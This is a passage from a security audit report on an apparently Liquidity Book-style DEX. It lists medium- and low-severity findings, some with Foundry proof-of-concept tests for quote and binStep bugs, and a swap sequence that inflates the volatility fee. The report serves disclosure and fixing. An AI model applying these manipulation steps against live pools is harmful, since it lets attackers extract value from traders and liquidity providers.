Root Cause: _fetchPairStates function

```solidity
function _fetchPairStates(address[] memory path, uint16[] memory binSteps)
    internal
    view
    returns (PairState[] memory pairStates)
{
    for (uint256 i = 0; i < hops; i++) {
        uint24 activeId = pair.getActiveId();
        (uint128 reserveX, uint128 reserveY) = pair.getBin(activeId);  // Only reads ONE bin
        // When swap > reserves, actual execution traverses more bins
        // But quote calculation uses only these limited reserves
    }
}
```

### Impact
Scenario: Large Swap by User

1. Pool has 100 tokens in active bin, 10,000+ in adjacent bins
2. User wants to swap 1,000 tokens (larger than active bin)
3. User calls getSwapOut() as documented in frontend integration guide
4. Quote returns: ~90 tokens (using only active bin's 100/100)
5. User sets amountOutMin = 80 based on quote
6. Actual swap would return ~997 tokens
7. MEV bot sees 917-token arbitrage opportunity
8. User receives only 80+ tokens instead of ~997

Who is affected:
Users making swaps larger than active bin liquidity.

### Proof of Concept
Add this in the AnalyticsFeature.t.sol file

```solidity
// ===== POC: Quote Only Reads Active Bin Bug =====

/**
 * @notice POC: getDetailedSwapQuote only reads active bin, ignoring liquidity in other bins
 * @dev This causes massively inaccurate quotes for swaps larger than active bin reserves
 * 
 * Setup:
 * - Active bin (8388608): 100 tokens each (small liquidity)
 * - Adjacent bins: 5000+ tokens each (large liquidity)
 * - Total liquidity: ~16,100 tokens
 * 
 * Bug: Quote reads ONLY active bin's 100/100 reserves
 * Result: Quote shows ~90% price impact, but actual swap has near-zero impact
 */
function test_POC_QuoteOnlyReadsActiveBin_UnderestimatesLiquidity() public {
    // Step 1: Add liquidity to ACTIVE bin (small amount - this is what quote reads)
    _addLiquidityToActiveBin(alice, 100 ether, 100 ether);
    
    // Step 2: Add liquidity to ADJACENT bins (large amounts - quote ignores these)
    _addLiquidityToMultipleBins(alice);
    
    // Verify total liquidity is much larger than active bin
    (,uint128 totalReservesX, uint128 totalReservesY,,,,) = pair.getPairStatistics();
    assertGt(totalReservesX, 100 ether, "Total X reserves should be much larger than active bin");
    assertGt(totalReservesY, 100 ether, "Total Y reserves should be much larger than active bin");
    
    // Step 3: Get quote for a swap larger than active bin's reserves
    uint256 swapAmount = 1000 ether;
    address[] memory path = new address[](2);
    path[0] = address(tokenA);
    path[1] = address(tokenB);
    uint16[] memory binSteps = new uint16[](1);
    binSteps[0] = BIN_STEP;
    
    (
        uint256 quotedAmountOut,
        ,
        uint256 quotedPriceImpact,
        ,
    ) = router.getDetailedSwapQuote(swapAmount, path, binSteps);
    
    // Step 4: Execute actual swap
    vm.startPrank(bob);
    tokenA.mint(bob, swapAmount);
    tokenA.approve(address(router), swapAmount);
    
    uint256 bobBalanceBefore = tokenB.balanceOf(bob);
    
    router.swapExactTokensForTokens(
        swapAmount,
        0,
        path,
        binSteps,
        bob,
        block.timestamp + 1000
    );
    
    uint256 actualAmountOut = tokenB.balanceOf(bob) - bobBalanceBefore;
    vm.stopPrank();
    
    // Step 5: Calculate actual price impact
    // idealOutput = swapAmount at 1:1 rate
    uint256 idealOutput = swapAmount;
    uint256 actualPriceImpact = idealOutput > actualAmountOut 
        ? ((idealOutput - actualAmountOut) * 10000) / idealOutput 
        : 0;
    
    // BUG DEMONSTRATION:
    // Quote shows massive impact because it only sees 100/100 in active bin
    // Actual swap traverses all bins and gets much better output
    
    // Quote should show very high impact (using only 100/100 reserves)
    assertGt(
        quotedPriceImpact, 
        5000, 
        "BUG: Quote should show >50% impact (only reads active bin)"
    );
    
    // But actual swap has much lower impact (uses all ~16,100 liquidity)
    assertLt(
        actualPriceImpact, 
        1000, 
        "Actual swap should have <10% impact (traverses all bins)"
    );
    
    // The discrepancy proves the bug
    uint256 discrepancyRatio = quotedPriceImpact / (actualPriceImpact + 1);
    assertGt(
        discrepancyRatio, 
        5, 
        "BUG CONFIRMED: Quote impact is >5x higher than actual"
    );
    
    // Actual output should be MUCH higher than quoted
    assertGt(
        actualAmountOut, 
        quotedAmountOut * 2, 
        "BUG CONFIRMED: Actual output is >2x the quoted amount"
    );
}

/**
 * @notice Helper to add liquidity across multiple bins for POC
 * @dev Adds to bins above and below active bin
 */
function _addLiquidityToMultipleBins(address user) internal {
    vm.startPrank(user);
    
    // Mint more tokens for multi-bin liquidity
    tokenA.mint(user, 20000 ether);
    tokenB.mint(user, 20000 ether);
    
    tokenA.approve(address(pair), 20000 ether);
    tokenB.approve(address(pair), 20000 ether);
    
    // Add to bins below active (will have more tokenA)
    uint256[] memory idsBelowActive = new uint256[](3);
    idsBelowActive[0] = ACTIVE_ID - 1;
    idsBelowActive[1] = ACTIVE_ID - 2;
    idsBelowActive[2] = ACTIVE_ID - 3;
    
    uint256[] memory amountsBelowActive = new uint256[](3);
    amountsBelowActive[0] = 2000 ether;
    amountsBelowActive[1] = 3000 ether;
    amountsBelowActive[2] = 5000 ether;
    
    tokenA.transfer(address(pair), 10000 ether);
    pair.mint(idsBelowActive, amountsBelowActive, user);
    
    // Add to bins above active (will have more tokenB)
    uint256[] memory idsAboveActive = new uint256[](3);
    idsAboveActive[0] = ACTIVE_ID + 1;
    idsAboveActive[1] = ACTIVE_ID + 2;
    idsAboveActive[2] = ACTIVE_ID + 3;
    
    uint256[] memory amountsAboveActive = new uint256[](3);
    amountsAboveActive[0] = 2000 ether;
    amountsAboveActive[1] = 3000 ether;
    amountsAboveActive[2] = 5000 ether;
    
    tokenB.transfer(address(pair), 10000 ether);
    pair.mint(idsAboveActive, amountsAboveActive, user);
    
    vm.stopPrank();
}
```

### Mitigation
Simulate bin traversal for accurate quotes

---

## [M-05] SwapQuoteResult.totalFee does not contain correct totalFee value

### Description
Inside of _calcualteSwapQuote function the logic for accumulating fees is incorrect, since it assumes that all of the fees are with same decimals of precision and from the same token (tho, It is know by earlier submission that the protocol assumes that every pair always has 1e18 rate), this behavior will return completely incorrect total fee value and will be very missleading.

### Example (every pool has reserves X and Y equal to 1000 * 1e Native decimals):

Path: usdc -> Weth -> Wbtc
amountIn: 1000 1e6

First swap usdc -> Weth
fee= 3 * 1e6
output = 997 * 1e18 weth
totalFee = 3 * 1e6

Second swap Weth -> Wbtc
fee = 2, 991 * 1e18
output = 99400900000 wbtc
totalFee = 3 * 1e6 usdc + 2, 991 * 1e18 weth

Keep in mind the, _calculateSwapQuote function does not consider at all the volatilityFee (I guess its because it was an intent to be pure) neither the values of the tokens when swapping them (tho, the whole system doesn't consider it) and hardcodes the baseFee, but still has some other minor logical flaws, so usability of it in general is questionable.

### Impact
Total fee returned from getDetailedSwapQuote, would be incorrect since its adds on fees from different hops (each fee from each hop is in different tokens, thus different decimals and value).

### Mitigation
Consider making totalFee an array with length of hops, just like amountsPerHop and activeBinsPerPair, and whenever calculating the fee push it to the corresponding id.

---

## [M-06] _calculateSwapQuote function uses incorrect fee calculation due to bad formula

### Description
The _calculateSwapQuote function uses bad logic for calculating the fee. In LBPair contract for calculating totalFee the feeHelpers getFeeAmountFrom function is used:

```solidity
(amount * totalFee) / (BASIS_POINTS + totalFee);
```

which returns the totalFee amout and deducts it from amountIn. But in _calculateSwapQuote function it is calculated what fee should be added to the amountIn:

```solidity
(amount * 30) / 10000
```

The result of this calculation is then substracted from amountIn, resulting in substracting a higher fee than it should.

Keep in mind the, _calculateSwapQuote function does not consider at all the volatilityFee (I guess its because it was an intent to be pure) neither the values of the tokens when swapping them (tho, the whole system doesn't consider it) and hardcodes the baseFee, but still has some other minor logical flaws, so usability of it in general is questionable.

### Impact
TotalFee is calculated wrongly, thus substracting more than it should, returning amountOut smaller than it should.

### Mitigation
Consider updating the logic for fee calculation and start using the getFeeAmountFrom like formula

---

## [M-07] Swap DOS Due to Empty Bin Traversal in _performSwap

### Description
The _performSwap function traverses bins sequentially (+1/-1) without using the existing _activeBinsBitmap to skip empty bins. Each empty bin counts toward the 100-bin safety limit, causing legitimate large swaps to revert when liquidity is sparse.

### Root Cause
In SwapCalculator.getNextActiveBin(), the function simply increments or decrements the bin ID by 1, ignoring the _activeBinsBitmap that tracks which bins actually have liquidity:

```solidity
function getNextActiveBin(uint24 currentBinId, bool swapForY) 
    internal pure returns (uint24 nextBinId) 
{
    if (swapForY) {
        nextBinId = currentBinId + 1;  // Just +1, doesn't check for liquidity
    } else {
        nextBinId = currentBinId - 1;  // Just -1, doesn't check for liquidity
    }
}
```

The contract has bitmap infrastructure that is NOT used:

```solidity
// These exist but aren't used in swap traversal:
mapping(uint256 => uint256) private _activeBinsBitmap;
function _isBinActive(uint24 binId) internal view returns (bool) { ... }
```

In _performSwap(), each bin traversed (including empty ones) counts toward binsTraversed:

```solidity
if (amountInLeftNormalized > 0) {
    if (binsTraversed >= maxBinsToTraverse) {  // Limit is 100
        revert LBPair__InsufficientLiquidityForSwap();
    }
    currentBinId = SwapCalculator.getNextActiveBin(currentBinId, swapForY);
    binsTraversed++;  // Counts even for empty bins!
}
```

### Impact
Failed Swaps During Normal Operation
- When price moves, LPs add new liquidity around the new price
- Old liquidity remains in distant bins
- Gaps of 100+ empty bins are common
- Any swap requiring liquidity across the gap reverts

---

## [L-01] Router:_getPriceFromOwnPair hardcodes binStep=25 causing incorrect bin and price calculations for non-25 binStep pairs

### Description
The protocol's factory allows creating pairs with multiple binStep values (10, 20, 25, 50, 100), but the Router's _getPriceFromOwnPair function hardcodes binStep=25 when calculating prices.

This causes getBinsAroundMarketPrice and getCurrentMarketBinId to return completely wrong results for any pair not using binStep=25.

### Protocol Allows Multiple binStep Values
Location: UmbraeLBFactory.sol

```solidity
constructor(address _owner) Ownable(_owner) {
    // Configure allowed bin steps
    _allowedBinSteps[10] = true;   // 0.1%
    _allowedBinSteps[20] = true;   // 0.2%
    _allowedBinSteps[25] = true;   // 0.25%
    _allowedBinSteps[50] = true;   // 0.5%
    _allowedBinSteps[100] = true;  // 1%  <-- ALLOWED
}
```

Users can create pairs with any of these binStep values:

```solidity
// Create pair with binStep = 100 (1% per bin)
factory.createPair(tokenA, tokenB, activeId, 100);  // Valid
```

### Root Cause
The Router Hardcodes binStep=25
In UmbraeLBRouter._getPriceFromOwnPair():

```solidity
function _getPriceFromOwnPair(address tokenA, address tokenB) internal view returns (uint256 price) {
    // Try to find pair with any bin step (prefer 25 basis points = 0.25%)
    address pair = FACTORY.getPair(tokenA, tokenB, 25);

    if (pair == address(0)) {
        pair = FACTORY.getPair(tokenA, tokenB, 10);
    }
    if (pair == address(0)) {
        pair = FACTORY.getPair(tokenA, tokenB, 100);  // Finds the 100 binStep pair
    }

    if (pair == address(0)) {
        return 1e18;
    }

    IUmbraeLBPair lbPair = IUmbraeLBPair(pair);
    uint24 activeId = lbPair.getActiveId();

    // BUG: ALWAYS uses binStep=25, even if pair has binStep=100!
    return BinHelper.getPriceFromId(activeId, 25);  // <-- HARDCODED 25
}
```

The function correctly finds a binStep=100 pair, but then uses binStep=25 for price calculation which is wrong.

### Impact
- Wrong Bin output: getBinsAroundMarketPrice returns bins far from actual market price
- Liquidity at Wrong Price: Users adding liquidity via Router helpers place funds at wrong price levels
- getCurrentMarketPrice and getCurrentMarketBinId return incorrect data

### POC
Add this fucntion test in the RouterSecurity.t.sol file and add this import:

```solidity
import "../src/libraries/BinHelper.sol";
```

Then this code:

```solidity
function test_POC_Issue_HardcodedBinStep() public {
    // Router's _getPriceFromOwnPair ALWAYS uses binStep=25 in BinHelper.getPriceFromId
    // But factory allows 10, 20, 25, 50, 100
    // If pair uses binStep=100, price calculations are completely wrong
    
    MockToken tokenX100 = new MockToken("Token X100", "TX100");
    MockToken tokenY100 = new MockToken("Token Y100", "TY100");
    
    if (address(tokenX100) > address(tokenY100)) {
        (tokenX100, tokenY100) = (tokenY100, tokenX100);
    }
    
    // Create pair with binStep = 100 (1% per bin)
    uint16 binStep100 = 100;
    uint24 offsetBinId = 8388608 + 100;  // 100 bins above center (actual bin 8388708)
    
    address pair100 = factory.createPair(
        address(tokenX100), 
        address(tokenY100), 
        offsetBinId,  // Active at 100 bins above center
        binStep100    // 1% per bin
    );
    
    // Add liquidity
    uint256 liq = 100_000e18;
    tokenX100.mint(lp, liq);
    tokenY100.mint(lp, liq);
    
    vm.startPrank(lp);
    tokenX100.transfer(pair100, liq / 2);
    tokenY100.transfer(pair100, liq / 2);
    
    uint256[] memory ids = new uint256[](1);
    uint256[] memory amounts = new uint256[](1);
    ids[0] = offsetBinId;
    amounts[0] = liq;
    UmbraeLBPair(pair100).mint(ids, amounts, lp);
    vm.stopPrank();
    
    // Direct check: the pair's actual active bin
    uint24 actualActiveBin = UmbraeLBPair(pair100).getActiveId();
    
    // Get bin IDs from router (uses wrong binStep=25 internally)
    uint24[] memory routerBins = router.getBinsAroundMarketPrice(
        address(tokenX100),
        address(tokenY100),
        binStep100,  // User specifies correct binStep=100
        5,
        5
    );
    
    // The Router's getCurrentMarketBinId uses _getPriceFromOwnPair
    // which hardcodes binStep=25 in BinHelper.getPriceFromId
    // This causes the center bin to be calculated incorrectly
    
    uint24 routerCenterBin = routerBins[5];  // Middle of returned array
    
    // ISSUE PROOF: Router returns WRONG center bin!
    // Actual active bin: 8388708
    // Router's center:   8388634 (74 bins off!)
    
    uint24 binDifference;
    if (routerCenterBin > actualActiveBin) {
        binDifference = routerCenterBin - actualActiveBin;
    } else {
        binDifference = actualActiveBin - routerCenterBin;
    }
    
    // Show the actual difference
    console.log("Actual active bin:", actualActiveBin);
    console.log("Router center bin:", routerCenterBin);
    console.log("BIN DIFFERENCE:", binDifference);
    
    // The bug causes significant bin offset (should be 0, but is ~74 bins)
    assertGt(binDifference, 50, "Issue 8: Router returns bins centered on WRONG bin ID");
    
    // Also verify price calculation error
    uint256 actualPrice = BinHelper.getPriceFromId(actualActiveBin, binStep100);
    uint256 routerPrice = BinHelper.getPriceFromId(actualActiveBin, 25);  // Router's hardcoded
    
    // Price difference should be massive (>50%)
    uint256 priceDiff;
    if (actualPrice > routerPrice) {
        priceDiff = ((actualPrice - routerPrice) * 100) / actualPrice;
    } else {
        priceDiff = ((routerPrice - actualPrice) * 100) / routerPrice;
    }
    
    console.log("Actual price (binStep=100):", actualPrice);
    console.log("Router price (binStep=25):", routerPrice);
    console.log("PRICE ERROR %:", priceDiff);
    
    assertGt(priceDiff, 40, "Issue 8: binStep hardcoding causes >40% price error");
}
```

### Recommendation
Fix _getPriceFromOwnPair to use the pair's actual binStep.

---

## [L-02] Oracle Updated But Not Readable - Dead Code Wastes Gas

### Description
The UmbraeLBPair.sol contract updates an internal oracle during every swap, storing historical price and volatility data. However, the contract does not implement any external functions to read this data. The IOracleManager interface defines getTWAP(), getVolatility(), and getLatestPrice() functions, but none are implemented in UmbraeLBPair.sol. This results in gas being wasted on every swap for data that cannot be accessed.

### Root cause
In UmbraeLBPair.swap(), the oracle is updated on every qualifying swap:

```solidity
// Update oracle
if (OracleLibrary.shouldUpdate(_lastOracleUpdate)) {
    _oracle.update(_activeId, _volatilityAccumulator);
    _lastOracleUpdate = uint40(block.timestamp);
    emit OracleUpdated(_activeId, _lastOracleUpdate);
}
```

The IOracleManager interface defines read functions:

```solidity
interface IOracleManager {
    function getTWAP(uint40 secondsAgo, uint40 windowSize) external view returns (uint24 averageId);
    function getVolatility(uint40 secondsAgo, uint40 windowSize) external view returns (uint128 volatility);
    function getLatestPrice() external view returns (uint24 activeId, uint40 timestamp);
    // ...
}
```

However, UmbraeLBPair:

- Does NOT inherit from IOracleManager
- Does NOT implement getTWAP()
- Does NOT implement getVolatility()
- Does NOT implement getLatestPrice()

The oracle data is written but can never be read.

### Impact
Oracle update costs ~5,000-20,000 gas per swap

---

## [L-03] Wrong implementation in finding uniswapV3 pool

### Description

```solidity
function _findPool(address tokenA, address tokenB) internal view returns (address pool) {
    // Try 0.3% fee tier first (most common)
    pool = _getPool(tokenA, tokenB, 3000);
    if (pool != address(0)) return pool;

    // Try 0.05% fee tier (stablecoin pairs)
    pool = _getPool(tokenA, tokenB, 500);
    if (pool != address(0)) return pool;

    // Try 1% fee tier (exotic pairs)
    pool = _getPool(tokenA, tokenB, 10000);
    if (pool != address(0)) return pool;

    return address(0);
}
```

only getting pool addresses from 0.3%, 0.05%, 1% fee tiers, not getting pool address for 0.01% fee tiers. And this 0.01% fee tier pools are ideal for stable coins, along with 0.05% fee tier.

### Recommendation
Recommended to add the pool for 0.01% fee tier

---

## [L-04] Hardcoded 25bp Bin Step causes Wrong Calculations

### Description
The analyzePosition function in PositionAnalyzer hardcodes a 25 basis point bin step when calculating price range percentage, but DLMM pairs can use different bin steps (1bp, 5bp, 10bp, 25bp, 50bp, 100bp). This causes the displayed price range to be wrong for any pair not using 25bp.

```solidity
uint256 binSpreadRange = maxBin - minBin;
info.priceRangePct = binSpreadRange * 25; // basis points
```

### Root Cause
The calculation multiplies the number of bins by a hardcoded 25bp instead of fetching the actual bin step from the pair contract.

### Impact
LPs see incorrect price coverage for their positions

### Recommended Fix
Fetch the actual bin step from the pair

---

## [L-05] Users could artificially increase the volatility fee by executing small swaps

### Description
Users could (if there is right pair set up) execute a sequence of small swaps back and forth to artificially increase the volatility fee, without paying any fee (or lloss of funds?).

### Example (will use low liquidity pair)

**Initial State:**

```
Active bin - 8 388 608:
- reserveX: 1
- reserveY: 1
- totalShares: 2

Other bin - 8 388 607:
- reserveX: 1
- reserveY: 0
- totalShares: 1
```

**Step 1 - swap 2 Y for X:**

```
Bin 8 388 608:
- reserveX: 0
- reserveY: 2

Bin 8 388 607:
- reserveX: 0
- reserveY: 1
- totalShares: 1
```

**Step 2 - swap 3X for Y:**

```
Bin 8 388 608:
- reserveX: 2
- reserveY: 0
- totalShares: 2

Bin 8 388 607:
- reserveX: 1
- reserveY: 0
- totalShares: 1
```

**Step 3 - swap 3Y for X:**

```
Bin 8 388 608:
- reserveX: 0
- reserveY: 2
- totalShares: 2

Bin 8 388 607:
- reserveX: 0
- reserveY: 1
- totalShares: 1
```

**Just keep repeating swap flow...**

Since these swaps are ultra small swaps:
- No fees are being paid by the user
- No big capital is needed (unless the user has to manipulate the market to achieve the desired state)

This could also be achieved (manipulating the volatility fee) by traversing through empty bins (which is doable now), but when that gets fixed and also that activeBinList starts being used for traversing, this would still be possible.

Also this can be done on an empty market, since once a market is deployed with some binStep, it can't be deployed again (by other user, so users would be forced to use that market).

One more thing to note is price difference between bins. When that gets fixed, it would be a bit more complex/difficult, since users should consider the price change (user should likely lose some tokens due to price change), but it wouldn't be major for a stable pair with small binStep.

### Impact
Volatility fee gets artificially increased, generating more LP fees (or pools can start being unattractive due to high fee)

### Mitigation
Consider that there could be couple of solutions.
Trader Joe uses filter period for this kind of patterns, also could be introduced the min swap amount or the check for 0 fee. Overall I believe that Trader Joe implementation is quite good.
